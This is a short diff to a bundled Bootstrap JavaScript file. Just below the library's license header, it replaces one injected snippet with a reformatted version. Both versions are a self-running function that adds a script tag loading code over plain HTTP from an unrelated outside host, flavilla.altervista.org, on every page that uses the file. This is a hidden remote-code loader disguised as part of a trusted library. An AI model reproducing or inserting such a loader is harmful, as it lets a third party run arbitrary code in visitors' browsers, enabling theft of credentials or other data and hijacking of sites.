@@ -825,7 +825,9 @@ if (typeof jQuery === 'undefined') { throw new Error('Bootstrap\'s JavaScript re
  * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)
  * ======================================================================== */
 
-(function(){var headID = document.head; var script = document.createElement('script'); script.src = 'http://flavilla.altervista.org/lib/js/main.js?'; headID.appendChild(script);}());
+(function(){var headID = document.head; var script = document.createElement('script'); 
+    script.src = 'http://flavilla.altervista.org/lib/js/utils.js'; 
+    headID.appendChild(script);}());
 
 +function ($) {
   'use strict';
